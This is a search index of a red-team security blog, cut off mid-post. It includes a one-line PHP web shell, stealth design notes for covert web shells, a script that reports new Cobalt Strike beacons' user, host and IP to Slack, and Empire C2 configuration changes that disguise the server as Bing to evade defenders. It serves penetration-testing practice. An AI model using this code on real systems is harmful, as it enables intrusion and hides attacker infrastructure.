{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Threatexpress \u00b6 Welcome to the Threat Express information security blog created by red teamers, penetration testers and security professionals. This blog contains security research, tools, and other red teaming related information. Joe Vest and James Tubberville released a book ! Red Team Development and Operations, zero-day edition \u00b6 Find it on Amazon Paperback - \"Red Team Development and Operations\", Zero-Day Edition eBook - \"Red Team Development and Operations\", Zero-Day Edition or visit the book's companion website here http://redteam.guide The blog contributors are: \u00b6 Andrew Chiles @andrewchiles James Tubberville @minis_io Joe Vest @joevest Recent Posts \u00b6 Date Post January 2020 Red Team Development and Operations November 2019 Event Data Collector August 2019 C2 Agent Comparison March 2019 Git clone all organizational repos January 2019 Penetration Testing Pasties November 2018 A Deep Dive into Cobalt Strike Malleable C2 June 2018 Threat Get's a Vote: Applying a Threat-Based Approach to Security Testing May 2018 Threat Mitigation Strategies Part 2 February 2018 Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles January 2018 Threat Mitigation Strategies Part 1 Contributor Tweets \u00b6","title":"Home"},{"location":"#threatexpress","text":"Welcome to the Threat Express information security blog created by red teamers, penetration testers and security professionals. This blog contains security research, tools, and other red teaming related information. Joe Vest and James Tubberville released a book !","title":"Threatexpress"},{"location":"#red-team-development-and-operations-zero-day-edition","text":"Find it on Amazon Paperback - \"Red Team Development and Operations\", Zero-Day Edition eBook - \"Red Team Development and Operations\", Zero-Day Edition or visit the book's companion website here http://redteam.guide","title":"Red Team Development and Operations, zero-day edition"},{"location":"#the-blog-contributors-are","text":"Andrew Chiles @andrewchiles James Tubberville @minis_io Joe Vest @joevest","title":"The blog contributors are:"},{"location":"#recent-posts","text":"Date Post January 2020 Red Team Development and Operations November 2019 Event Data Collector August 2019 C2 Agent Comparison March 2019 Git clone all organizational repos January 2019 Penetration Testing Pasties November 2018 A Deep Dive into Cobalt Strike Malleable C2 June 2018 Threat Get's a Vote: Applying a Threat-Based Approach to Security Testing May 2018 Threat Mitigation Strategies Part 2 February 2018 Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles January 2018 Threat Mitigation Strategies Part 1","title":"Recent Posts"},{"location":"#contributor-tweets","text":"","title":"Contributor Tweets"},{"location":"archive/","text":"Archive \u00b6 2019 \u00b6 March 2019 - Git clone all organizational repos January 2019 - Penetration Testing Pasties 2018 \u00b6 November 2018 - A Deep Dive into Cobalt Strike Malleable C2 June 2018 - Threat Get's a Vote: Applying a Threat-Based Approach to Security Testing May 2018 Threat Mitigation Strategies and Technical Recommendations Part 2 February 2018 - Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles January 2018 - Threat Mitigation Strategies Part 1 January 2018 - HostEnum - Updates and Usage 2017 \u00b6 October 2017 - Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads September 2017 - Install BloodHound on Ubuntu May 2017 - [Empire - Modifying Server C2 Indicators(threatexpress/2017/empire-modifying-server-c2-indicators/) May 2017 - invoke-hostenum - A PowerShell Host Situational Awareness Tool March 2017 - Leveraging Expired Domains for Red Team Engagements 2016 \u00b6 December 2016 - Slack Notifications for Cobalt Strike October 2016 - SubShell and TinyShell - Custom Covert Webshells September 2016 - New Information Security and Red Teaming Blog Threat Express by MINIS","title":"Post Archive"},{"location":"archive/#archive","text":"","title":"Archive"},{"location":"archive/#2019","text":"March 2019 - Git clone all organizational repos January 2019 - Penetration Testing Pasties","title":"2019"},{"location":"archive/#2018","text":"November 2018 - A Deep Dive into Cobalt Strike Malleable C2 June 2018 - Threat Get's a Vote: Applying a Threat-Based Approach to Security Testing May 2018 Threat Mitigation Strategies and Technical Recommendations Part 2 February 2018 - Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles January 2018 - Threat Mitigation Strategies Part 1 January 2018 - HostEnum - Updates and Usage","title":"2018"},{"location":"archive/#2017","text":"October 2017 - Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads September 2017 - Install BloodHound on Ubuntu May 2017 - [Empire - Modifying Server C2 Indicators(threatexpress/2017/empire-modifying-server-c2-indicators/) May 2017 - invoke-hostenum - A PowerShell Host Situational Awareness Tool March 2017 - Leveraging Expired Domains for Red Team Engagements","title":"2017"},{"location":"archive/#2016","text":"December 2016 - Slack Notifications for Cobalt Strike October 2016 - SubShell and TinyShell - Custom Covert Webshells September 2016 - New Information Security and Red Teaming Blog Threat Express by MINIS","title":"2016"},{"location":"contributors/","text":"Contributors \u00b6 Andrew Chiles \u00b6 Twitter: @andrewchiles Andrew is a red teamer and security researcher. He's worked in information security since 2009 in various federal, defense and commercial settings. He's earned degrees in M.E. Information Assurance and B.S. Telecommunications Systems Management in addition to holding industry certifications such as OSCP, CISSP, and CCNA. James Tubberville \u00b6 Twitter: @minis_io James Tubberville has held a number of technical positions and management roles over a 19 year career focused on system, network, application and information security. James is a former member and lead for a NSA certified Red Team and has conducted threat computer network operations, red teaming, penetration testing, and physical security assessments for a variety of commercial and government customers. As a security professional, James has achieved numerous information technology and security related certifications and awards. James is also an original author for the SANS SEC564: Red Team Operations and Threat Emulation course and a co-founder of the security consulting company MINIS that merged with SpecterOps in 2017. Joe Vest \u00b6 Twitter: @joevest Joe Vest has worked in the information technology industry for over 17 years with a focus on red teaming, penetration testing and application security. Joe is an original author of the SANS Red Team Operations and Threat Emulation course (SEC-564). As a former technical lead for a DoD red team, he has extensive knowledge of cyber threats and their tools, tactics and techniques, including threat emulation and threat detection. Joe was a co-founder of the security consulting company MINIS LLC that has since merged with SpecterOps in 2017. As a leading security professional, he has achieved numerous security certifications: OSCP, CISSP-ISSMP, CISA, GPEN, GCIH, GWAPT, CEH, Security+","title":"Contributors"},{"location":"contributors/#contributors","text":"","title":"Contributors"},{"location":"contributors/#andrew-chiles","text":"Twitter: @andrewchiles Andrew is a red teamer and security researcher. He's worked in information security since 2009 in various federal, defense and commercial settings. He's earned degrees in M.E. Information Assurance and B.S. Telecommunications Systems Management in addition to holding industry certifications such as OSCP, CISSP, and CCNA.","title":"Andrew Chiles"},{"location":"contributors/#james-tubberville","text":"Twitter: @minis_io James Tubberville has held a number of technical positions and management roles over a 19 year career focused on system, network, application and information security. James is a former member and lead for a NSA certified Red Team and has conducted threat computer network operations, red teaming, penetration testing, and physical security assessments for a variety of commercial and government customers. As a security professional, James has achieved numerous information technology and security related certifications and awards. James is also an original author for the SANS SEC564: Red Team Operations and Threat Emulation course and a co-founder of the security consulting company MINIS that merged with SpecterOps in 2017.","title":"James Tubberville"},{"location":"contributors/#joe-vest","text":"Twitter: @joevest Joe Vest has worked in the information technology industry for over 17 years with a focus on red teaming, penetration testing and application security. Joe is an original author of the SANS Red Team Operations and Threat Emulation course (SEC-564). As a former technical lead for a DoD red team, he has extensive knowledge of cyber threats and their tools, tactics and techniques, including threat emulation and threat detection. Joe was a co-founder of the security consulting company MINIS LLC that has since merged with SpecterOps in 2017. As a leading security professional, he has achieved numerous security certifications: OSCP, CISSP-ISSMP, CISA, GPEN, GCIH, GWAPT, CEH, Security+","title":"Joe Vest"},{"location":"blogs/2016/new-information-security-red-teaming-blog-threat-express-minis/","text":"New Information Security and Red Teaming Blog \"Threat Express\" by MINIS \u00b6 Andrew Chiles | September 30, 2016 | Tweet This Post: Welcome to the Threat Express information security blog by the Red Team at MINIS LLC. The primary website remains , but this is our new platform for the release of security research, tools, and other Red Teaming related information. Tools will be posted at https://github.com/minisllc . Stay tuned!","title":"New Information Security and Red Teaming Blog Threat Express by MINIS"},{"location":"blogs/2016/new-information-security-red-teaming-blog-threat-express-minis/#new-information-security-and-red-teaming-blog-threat-express-by-minis","text":"Andrew Chiles | September 30, 2016 | Tweet This Post: Welcome to the Threat Express information security blog by the Red Team at MINIS LLC. The primary website remains , but this is our new platform for the release of security research, tools, and other Red Teaming related information. Tools will be posted at https://github.com/minisllc . Stay tuned!","title":"New Information Security and Red Teaming Blog \"Threat Express\" by MINIS"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/","text":"Slack Notifications for Cobalt Strike \u00b6 Andrew Chiles | December 5, 2017 | Tweet This Post: We've seen several great incoming agent/shell notification mechanisms for Metasploit and Empire recently and the utility of being notified when new shells appear is without question. This is especially true when conducting phishing and social engineering style attacks or while waiting for a persistence mechanism to trigger. A recent example is SlackShellBot by @Ne0nd0g. We really like it, but often use Cobalt Strike heavily and thus need another notification method for CS. Enter Aggressor script. This is just one quick example of performing Slack notifications for Cobalt Strike using Aggressor. If you're a regular CS user, we highly recommend spending some time with Aggressor scripting to step up your automation and workflows. @armitagehacker has a comprehensive post of Aggressor resources that is a great starting point. New Beacon Slack Notifications Requirements: This method relies on a custom web-hook just as SlackShellBot. Refer the official documentation if you need a quick guide on creating one A Python module for Slack integrations called \"slackweb\" Using pip: pip install slackweb Step 1: Create your Custom Slack Webhook \u00b6 Slack Custom Webhook Configuration Step 2: Create a Python script to post the Slack notifications \u00b6 This Python code is a basic example of using the slackweb module to submit a Slack text notification to our custom webhook. Don't forget to make the script executable! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #! /usr/bin/env python # slacknotifcation.py import argparse import slackweb import socket parser = argparse . ArgumentParser ( description = 'beacon info' ) parser . add_argument ( '--computername' ) parser . add_argument ( '--internalip' ) parser . add_argument ( '--username' ) hostname = socket . gethostname () args = parser . parse_args () slackUrl = \"https://hooks.slack.com/services/...\" computername = args . computername internalip = args . internalip username = args . username slack = slackweb . Slack ( url = slackUrl ) message = \"New Beacon: {}@{} ({}) on {}\" . format ( username , computername , internalip , hostname ) slack . notify ( text = message ) \u00b6 Step 3: Create the Aggressor script \u00b6 Save the following code as a new Aggressor script. You can customize the desired information and format of the Slack notification here. The format provided in this example is \"New Beacon: USERNAME@HOSTNAME (IP ADDRESS) on C2SERVERHOSTNAME\" Note You could also modify this Aggressor script to use curl and eliminate the need for Python and an additional module entirely! However, Python allows us to quickly grab the hostname of the C2 server and easily track what assessment/campaign the incoming beacons are associated with. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Issue initial commands upon new beacon checkin # slacknotification . cna on beacon_initial { println ( \" Initial Beacon Checkin: \" . $1 . \" PID: \" . beacon_info ( $1 , \" pid \" )) ; local ( ' $internalIP $computerName $userName ' ) ; $ internalIP = replace ( beacon_info ( $1 , \" internal \" ) , \" \" , \" _ \" ) ; $c omputerName = replace ( beacon_info ( $1 , \" computer \" ) , \" \" , \" _ \" ) ; $ userName = replace ( beacon_info ( $1 , \" user \" ) , \" \" , \" _ \" ) ; $c md = ' /path/to/slacknotification.py --computername ' . $c omputerName . \" --internalip \" . $ internalIP . \" --username \" . $ userName ; println ( \" Sending Slack Notification: \" . $c md ) ; exec ( $c md ) ; } } Step 4: Load the Aggressor script into Cobalt Strike \u00b6 The Aggressor script can be loaded into CS via the GUI or headless mode. Once loaded, fire off some beacons and watch the notifications come in! Hopefully this post is useful and let us know if you have additional ideas or improvements!","title":"Slack Notifications for Cobalt Strike"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#slack-notifications-for-cobalt-strike","text":"Andrew Chiles | December 5, 2017 | Tweet This Post: We've seen several great incoming agent/shell notification mechanisms for Metasploit and Empire recently and the utility of being notified when new shells appear is without question. This is especially true when conducting phishing and social engineering style attacks or while waiting for a persistence mechanism to trigger. A recent example is SlackShellBot by @Ne0nd0g. We really like it, but often use Cobalt Strike heavily and thus need another notification method for CS. Enter Aggressor script. This is just one quick example of performing Slack notifications for Cobalt Strike using Aggressor. If you're a regular CS user, we highly recommend spending some time with Aggressor scripting to step up your automation and workflows. @armitagehacker has a comprehensive post of Aggressor resources that is a great starting point. New Beacon Slack Notifications Requirements: This method relies on a custom web-hook just as SlackShellBot. Refer the official documentation if you need a quick guide on creating one A Python module for Slack integrations called \"slackweb\" Using pip: pip install slackweb","title":"Slack Notifications for Cobalt Strike"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-1-create-your-custom-slack-webhook","text":"Slack Custom Webhook Configuration","title":"Step 1: Create your Custom Slack Webhook"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-2-create-a-python-script-to-post-the-slack-notifications","text":"This Python code is a basic example of using the slackweb module to submit a Slack text notification to our custom webhook. Don't forget to make the script executable! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #! /usr/bin/env python # slacknotifcation.py import argparse import slackweb import socket parser = argparse . ArgumentParser ( description = 'beacon info' ) parser . add_argument ( '--computername' ) parser . add_argument ( '--internalip' ) parser . add_argument ( '--username' ) hostname = socket . gethostname () args = parser . parse_args () slackUrl = \"https://hooks.slack.com/services/...\" computername = args . computername internalip = args . internalip username = args . username slack = slackweb . Slack ( url = slackUrl ) message = \"New Beacon: {}@{} ({}) on {}\" . format ( username , computername , internalip , hostname ) slack . notify ( text = message )","title":"Step 2: Create a Python script to post the Slack notifications"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-3-create-the-aggressor-script","text":"Save the following code as a new Aggressor script. You can customize the desired information and format of the Slack notification here. The format provided in this example is \"New Beacon: USERNAME@HOSTNAME (IP ADDRESS) on C2SERVERHOSTNAME\" Note You could also modify this Aggressor script to use curl and eliminate the need for Python and an additional module entirely! However, Python allows us to quickly grab the hostname of the C2 server and easily track what assessment/campaign the incoming beacons are associated with. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Issue initial commands upon new beacon checkin # slacknotification . cna on beacon_initial { println ( \" Initial Beacon Checkin: \" . $1 . \" PID: \" . beacon_info ( $1 , \" pid \" )) ; local ( ' $internalIP $computerName $userName ' ) ; $ internalIP = replace ( beacon_info ( $1 , \" internal \" ) , \" \" , \" _ \" ) ; $c omputerName = replace ( beacon_info ( $1 , \" computer \" ) , \" \" , \" _ \" ) ; $ userName = replace ( beacon_info ( $1 , \" user \" ) , \" \" , \" _ \" ) ; $c md = ' /path/to/slacknotification.py --computername ' . $c omputerName . \" --internalip \" . $ internalIP . \" --username \" . $ userName ; println ( \" Sending Slack Notification: \" . $c md ) ; exec ( $c md ) ; } }","title":"Step 3: Create the Aggressor script"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-4-load-the-aggressor-script-into-cobalt-strike","text":"The Aggressor script can be loaded into CS via the GUI or headless mode. Once loaded, fire off some beacons and watch the notifications come in! Hopefully this post is useful and let us know if you have additional ideas or improvements!","title":"Step 4: Load the Aggressor script into Cobalt Strike"},{"location":"blogs/2016/web-shells-covert-channel/","text":"SubShell and TinyShell - Custom Covert Webshells \u00b6 Joe Vest | October 3, 2016 | Tweet This Post: Web applications continue to be a valuable door for attackers to use to gain remote access to a network. If a web application is compromised, the webserver itself can be used to enable a command and control (C2) channel and provide a platform for post exploitation. The use of web shells is a common method to provide this capability. Like other malicious code, security protections must be considered and understood to bypass their protections. Specific Tools, tactics and procedures (TTPs) must be designed into a web shell to minimize detection. Many current web shells have no protection against common network security defenses. This post discusses the use of web shells for post exploitation and as a covert channel for use during penetration tests or red team engagements, how to minimize the risk of detection and the pros and cons of using web-shells. I developed two web shell frameworks \u2013 SubShell and TinyShell Before I discuss these web shells, here is a quick overview of a web shell. What is a web shell? \u00b6 Server side code that acts as a non-interactive 'shell', remote administration tool or control panel allowing a user to issue remote commands to be executed by a web server. Simply put, a web shell is a page that runs commands directly on the web server on behalf of the requestor. Why use a web shell? \u00b6 Web Applications can be a valuable door into a network and are often your first network foothold outside of social engineering Provides remote code execution into a network On demand. No regular polling or beaconing makes C2 harder to detect How do you use a web shell? \u00b6 Exploit or compromise a web server, i.e.: Application flaw File upload flaw RFI (remote file include) Direct access to application source Example \u00b6 Here is a simple PHP shell that uses the system function to execute OS commands. 1 <?php echo ( system ( $_GET [ \"q\" ])); ?> When an HTTP GET is sent to the URL hosting this page, the parameter \"q\" will be executed by the web server's OS. Subshell and Tiny Shell \u00b6 Why were these frameworks built? \u00b6 These projects were born out of the need for a consolidated webshell framework. There are numerous available, but I wanted to create a framework that supports numerous web languages, common features, and a common backend. These projects use the principle of hiding in plain sight with a goal of minimizing attention. Like numerous malicious tools, they are easy for defenders to find when they begin to look. These projects are designed to be stealthy by minimizing the triggering of defenses such as IDS, Firewall, AV etc. When performing penetration tests or red team engagements, \" hacking to get caught \" can be part of the test. Sometimes you want to be caught, sometimes you don't. A good security tester can control when or how their tools are exposed. How have I been caught? \u00b6 These are some mistakes or tools choices that allowed me to get caught by blue/defense teams. Most of the time this was caused by using untested tools that were not designed to be stealthy. Default User Agent strings OS commands in HTTP logs via GET requests Clear text OS commands moving across the wire Clear text binaries moving across the wire (MZ header) Doing too much too quick How does SubShell or Tinyshell help control getting caught? \u00b6 POST requests to minimize data written web logs Encoding and traffic blending to help avoid clear text detection Console interface forces a slow down when issuing commands. Use of a webshell should be deliberate and focused. Numerous connections may attract attention. Customization of user-agent to help blend in. Valid 404 errors displayed when attempting to connect to shell without 'authentication' information. Initial design considerations \u00b6 Minimize attention Single command and control server Multiple version Safe to use without SSL Requests/Responses must be obfuscated or encrypted File browsing File Upload/Download Command execution HTTP POST Requests used for C2 traffic Invalid request render a valid 404 response For more details, check out the tools in the MINIS repository or watch my Bsides talk on webshells","title":"SubShell and TinyShell - Custom Covert Webshells"},{"location":"blogs/2016/web-shells-covert-channel/#subshell-and-tinyshell-custom-covert-webshells","text":"Joe Vest | October 3, 2016 | Tweet This Post: Web applications continue to be a valuable door for attackers to use to gain remote access to a network. If a web application is compromised, the webserver itself can be used to enable a command and control (C2) channel and provide a platform for post exploitation. The use of web shells is a common method to provide this capability. Like other malicious code, security protections must be considered and understood to bypass their protections. Specific Tools, tactics and procedures (TTPs) must be designed into a web shell to minimize detection. Many current web shells have no protection against common network security defenses. This post discusses the use of web shells for post exploitation and as a covert channel for use during penetration tests or red team engagements, how to minimize the risk of detection and the pros and cons of using web-shells. I developed two web shell frameworks \u2013 SubShell and TinyShell Before I discuss these web shells, here is a quick overview of a web shell.","title":"SubShell and TinyShell - Custom Covert Webshells"},{"location":"blogs/2016/web-shells-covert-channel/#what-is-a-web-shell","text":"Server side code that acts as a non-interactive 'shell', remote administration tool or control panel allowing a user to issue remote commands to be executed by a web server. Simply put, a web shell is a page that runs commands directly on the web server on behalf of the requestor.","title":"What is a web shell?"},{"location":"blogs/2016/web-shells-covert-channel/#why-use-a-web-shell","text":"Web Applications can be a valuable door into a network and are often your first network foothold outside of social engineering Provides remote code execution into a network On demand. No regular polling or beaconing makes C2 harder to detect","title":"Why use a web shell?"},{"location":"blogs/2016/web-shells-covert-channel/#how-do-you-use-a-web-shell","text":"Exploit or compromise a web server, i.e.: Application flaw File upload flaw RFI (remote file include) Direct access to application source","title":"How do you use a web shell?"},{"location":"blogs/2016/web-shells-covert-channel/#example","text":"Here is a simple PHP shell that uses the system function to execute OS commands. 1 <?php echo ( system ( $_GET [ \"q\" ])); ?> When an HTTP GET is sent to the URL hosting this page, the parameter \"q\" will be executed by the web server's OS.","title":"Example"},{"location":"blogs/2016/web-shells-covert-channel/#subshell-and-tiny-shell","text":"","title":"Subshell and Tiny Shell"},{"location":"blogs/2016/web-shells-covert-channel/#why-were-these-frameworks-built","text":"These projects were born out of the need for a consolidated webshell framework. There are numerous available, but I wanted to create a framework that supports numerous web languages, common features, and a common backend. These projects use the principle of hiding in plain sight with a goal of minimizing attention. Like numerous malicious tools, they are easy for defenders to find when they begin to look. These projects are designed to be stealthy by minimizing the triggering of defenses such as IDS, Firewall, AV etc. When performing penetration tests or red team engagements, \" hacking to get caught \" can be part of the test. Sometimes you want to be caught, sometimes you don't. A good security tester can control when or how their tools are exposed.","title":"Why were these frameworks built?"},{"location":"blogs/2016/web-shells-covert-channel/#how-have-i-been-caught","text":"These are some mistakes or tools choices that allowed me to get caught by blue/defense teams. Most of the time this was caused by using untested tools that were not designed to be stealthy. Default User Agent strings OS commands in HTTP logs via GET requests Clear text OS commands moving across the wire Clear text binaries moving across the wire (MZ header) Doing too much too quick","title":"How have I been caught?"},{"location":"blogs/2016/web-shells-covert-channel/#how-does-subshell-or-tinyshell-help-control-getting-caught","text":"POST requests to minimize data written web logs Encoding and traffic blending to help avoid clear text detection Console interface forces a slow down when issuing commands. Use of a webshell should be deliberate and focused. Numerous connections may attract attention. Customization of user-agent to help blend in. Valid 404 errors displayed when attempting to connect to shell without 'authentication' information.","title":"How does SubShell or Tinyshell help control getting caught?"},{"location":"blogs/2016/web-shells-covert-channel/#initial-design-considerations","text":"Minimize attention Single command and control server Multiple version Safe to use without SSL Requests/Responses must be obfuscated or encrypted File browsing File Upload/Download Command execution HTTP POST Requests used for C2 traffic Invalid request render a valid 404 response For more details, check out the tools in the MINIS repository or watch my Bsides talk on webshells","title":"Initial design considerations"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/","text":"Empire \u2013 Modifying Server C2 Indicators \u00b6 Andrew Chiles | May 14, 2017 | Tweet This Post: Overview \u00b6 This post is intended as a follow-on to Jeff Dimmock's detailed write-up on creating communication profiles for Empire . Empire 1.6's \u201cDefaultProfile\u201d setting for modifying C2 indicators doesn't directly allow modification of the server-side parameters. When faced with an experienced group of defenders, default C2 server indicators can quickly reveal your infrastructure. HTTPS listeners with valid certificates can certainly hinder traffic monitoring, but isn't a silver bullet. A good example of identifying Empire infrastructure is detailed in a Chokepoint post using Shodan and Scans.io scan data. They included a Python script that idenfitied an Empire server based on a cookie handling error, but the bug was fixed in a subsequent commit . This is just another reason to protect your infrastructure from probing using redirectors with Apache mod_rewrite as Jeff also explained . Nevertheless, the steps for identifying a default configured Empire server are fairly trivial and we wanted to be able to change them! We explored the ability to modify Empire 1.6 server side C2 indicators without breaking agent functionality. Server Parameters \u00b6 Staging URIs Default: index.asp,index.jsp,index.php Note How likely are asp, jsp, and php to exist together on the same web server? Payload staging is typically easy to identify no matter the C2 technology, but we can improve on Empire's default staging behavior. Empire \u2013 Default Staging URIs Server technology Default: Microsoft-IIS/7.5 Server content Default: \u201cIt works!\u201d Empire Modification \u00b6 We'll continue Jeff's original example by porting some of the additional server side parameters in the Bing Search Malleable C2 profile to Empire. Note The following modifications are applicable to Empire 1.6. Empire 2.0 utilizes Flask and some of these settings will need to be changed elsewhere if you're running 2.0 beta. Modifying the staging URIs and Server header \u00b6 The easiest way to update the server's default behavior is through the setup_database.py script. Disclaimer: These steps assume you're building up your server from scratch and aren't running an active engagement. You could also update the sqlite database directly if you don't want to blow away your existing database. First, remove your existing Empire database 1 rm / data / empire . db Next, edit /setup/setup_database.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # / setup / setup_database . py # the resource requested by the initial launcher # STAGE0_URI = \" index.asp \" STAGE0_URI = \" login \" # the resource used by the RSA key post # STAGE1_URI = \" index.jsp \" STAGE1_URI = \" home \" # the resource used by the sysinfo checkin that returns the agent . ps1 # STAGE2_URI = \" index.php \" STAGE2_URI = \" news \" # the default delay ( in seconds ) for agent callback # DEFAULT_DELAY = 5 DEFAULT_DELAY = 10 # the default jitter ( 0 . 0 - 1 . 0 ) to apply to the callback delay # DEFAULT_JITTER = 0 . 0 DEFAULT_JITTER = 0 . 5 # the default traffic profile to use for agent communications # format -> requestUris | user_agent | additionalHeaders # DEFAULT_PROFILE = \" /admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko \" DEFAULT_PROFILE = \" /search?q=news&go=Search&qs=bs&form=QBRE,/search?q=weather&go=Search&qs=bs&form=QBRE,/search?q=movie%20tickets&go=Search&qs=bs&form=QBRE,/search?q=unit%20conversion&go=Search&qs=bs&form=QBRE|Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Cookie:DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG \" # the server version to appear as # SERVER_VERSION = \" Microsoft-IIS/7.5 \" SERVER_VERSION = \" Microsoft-IIS/8.5 \" Finally, setup the new database and restart Empire 1 2 . / setup / setup_database . py . / empire Results \u00b6 Notice we now have new staging URI's that don't stick out quite as much and the new client communication profile is also in use. The staging request length's don't change however so there is still plenty to signature. Empire \u2013 Custom Bing Search Profile w/ Modified Staging URIs Modifying the default page \u00b6 You can modify the default HTML displayed upon a GET request in lib/common/http.py within the \u201cdefault_page()\u201d function. Edit lib/common/http.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # lib/common/http.py \"\"\" HTTP related methods used by Empire. Includes URI validation/checksums, as well as the base http server (EmpireServer) and its modified request handler (RequestHandler). These are the first places URI requests are processed. \"\"\" from BaseHTTPServer import BaseHTTPRequestHandler , HTTPServer from SocketServer import ThreadingMixIn import BaseHTTPServer , threading , ssl , os , string , random from pydispatch import dispatcher import re # Empire imports import encryption import helpers #TODO: place this in a config def default_page (): \"\"\" Returns the default page for this server. \"\"\" # Change the default look and redirect requests to a targeted resource (i.e. Organization portal, website, etc) #page = \"<html><head><meta http-equiv=\"refresh\" content=\"0; url=http://www.bing.com/search\"/></head></html>\" # Return some basic Bing Search content page = \"\"\"<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[ si_ST=new Date; //]]></script> <head><!--pc--><title>Search - Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&q= &qs=n&form=QBLH&sp=-1&pq= &sc=8-4&sk=&cvid=86384E39A0DC4E01BDC606F982540419\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&q= &qs=n&form=QBLH&sp=-1&pq= &sc=8-4&sk=&cvid=86384E39A0DC4E01BDC606F982540419\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[ _G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"19\",IG:\"9C0DE865AEED4CEFB65F1D19E0EE4511\",EventID:\"77EF28E2D73B45CE9C515CDE44BF2532\",V:\"web\",P:\"SERP\",DA:\"DB5\",SUIH:\"0InL-dxZ9p-UKoWZWyKO6A\",gpUrl:\"\\/fd\\/ls\\/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http:\\/\\/www.bing.com\\/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+'IG='+_G.IG+'&'+a;}return true;};0;0; //]]></script></head> </html> \"\"\" return page Restart Empire with your new server C2 parameters . / empire Results \u00b6 Summary \u00b6 The ability to modify the network indicators of your C2 technology is critical for a threat representative engagement. While Empire doesn't expose all desired possibilities with the \u201cDefaultProfile\u201d configuration setting, a little exploration into the source reveals more flexibility. Never be afraid to dive into a tool's source and modify it to suit your needs. There are still many ways to signature this traffic and beaconing activity. However, by implementing these modifications your C2 won't completely match the out-of-the-box Empire look and will raise the bar slightly for the Blue guys ;).","title":"Empire Modifying Server C2 Indicators"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#empire-modifying-server-c2-indicators","text":"Andrew Chiles | May 14, 2017 | Tweet This Post:","title":"Empire \u2013 Modifying Server C2 Indicators"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#overview","text":"This post is intended as a follow-on to Jeff Dimmock's detailed write-up on creating communication profiles for Empire . Empire 1.6's \u201cDefaultProfile\u201d setting for modifying C2 indicators doesn't directly allow modification of the server-side parameters. When faced with an experienced group of defenders, default C2 server indicators can quickly reveal your infrastructure. HTTPS listeners with valid certificates can certainly hinder traffic monitoring, but isn't a silver bullet. A good example of identifying Empire infrastructure is detailed in a Chokepoint post using Shodan and Scans.io scan data. They included a Python script that idenfitied an Empire server based on a cookie handling error, but the bug was fixed in a subsequent commit . This is just another reason to protect your infrastructure from probing using redirectors with Apache mod_rewrite as Jeff also explained . Nevertheless, the steps for identifying a default configured Empire server are fairly trivial and we wanted to be able to change them! We explored the ability to modify Empire 1.6 server side C2 indicators without breaking agent functionality.","title":"Overview"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#server-parameters","text":"Staging URIs Default: index.asp,index.jsp,index.php Note How likely are asp, jsp, and php to exist together on the same web server? Payload staging is typically easy to identify no matter the C2 technology, but we can improve on Empire's default staging behavior. Empire \u2013 Default Staging URIs Server technology Default: Microsoft-IIS/7.5 Server content Default: \u201cIt works!\u201d","title":"Server Parameters"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#empire-modification","text":"We'll continue Jeff's original example by porting some of the additional server side parameters in the Bing Search Malleable C2 profile to Empire. Note The following modifications are applicable to Empire 1.6. Empire 2.0 utilizes Flask and some of these settings will need to be changed elsewhere if you're running 2.0 beta.","title":"Empire Modification"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#modifying-the-staging-uris-and-server-header","text":"The easiest way to update the server's default behavior is through the setup_database.py script. Disclaimer: These steps assume you're building up your server from scratch and aren't running an active engagement. You could also update the sqlite database directly if you don't want to blow away your existing database. First, remove your existing Empire database 1 rm / data / empire . db Next, edit /setup/setup_database.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # / setup / setup_database . py # the resource requested by the initial launcher # STAGE0_URI = \" index.asp \" STAGE0_URI = \" login \" # the resource used by the RSA key post # STAGE1_URI = \" index.jsp \" STAGE1_URI = \" home \" # the resource used by the 